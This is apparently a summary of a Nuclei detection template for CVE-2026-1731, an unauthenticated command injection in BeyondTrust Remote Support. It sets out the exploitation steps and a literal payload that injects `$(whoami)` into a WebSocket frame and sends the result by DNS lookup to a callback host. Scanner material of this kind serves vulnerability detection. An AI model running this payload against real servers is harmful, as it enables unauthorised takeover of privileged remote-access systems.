---
cve_id: CVE-2026-1731
template_path: nuclei-templates/javascript/cves/2026/CVE-2026-1731.yaml
affected_product: BeyondTrust Remote Support
severity: critical
authentication: none
external_callback: true
affected_versions: unknown
preconditions: []
poc_classification: rce
---

## Vulnerability
BeyondTrust Remote Support (and Privileged Remote Access) contains an unauthenticated remote code execution flaw (CWE-78) in the WebSocket endpoint `/nw`. An attacker first extracts the target `company` identifier via the unauthenticated `/get_mech_list?version=3` endpoint, then upgrades to a WebSocket session on port 443 and injects OS commands inside a binary WebSocket frame. Commands are executed directly on the server with the privileges of the BeyondTrust service.

**Impact:** Full system compromise; arbitrary command execution without authentication or user interaction.  
**Remediation:** Apply the latest security patches (BT26-02) from BeyondTrust.  
**Classification:** CVE-2026-1731, EPSS 0.52964 (97.889th percentile).

## PoC / Detection
Classification: rce

The template performs active exploitation for verification:  
1. Issues an unauthenticated HTTP GET to `/get_mech_list?version=3`, extracts the `default_company` value with regex.  
2. Opens a TCP/TLS connection to `Host:443` and sends a crafted WebSocket upgrade request (`Sec-WebSocket-Protocol: ingredi support desk customer thin` + `X-Ns-Company` header).  
3. On successful 101 Switching Protocols response, constructs and sends a masked binary WebSocket frame (opcode 0x02) containing the injection payload `hax[$(/usr/bin/nslookup $(whoami).{{interactsh-url}})]`.  
4. Matcher triggers on DNS interaction recorded by interactsh, confirming successful command execution.

## References
- https://attackerkb.com/topics/jNMBccstay/cve-2026-1731/rapid7-analysis
- https://www.hacktron.ai/blog/cve-2026-1731-beyondtrust-remote-support-rce
- https://www.beyondtrust.com/trust-center/security-advisories/bt26-02
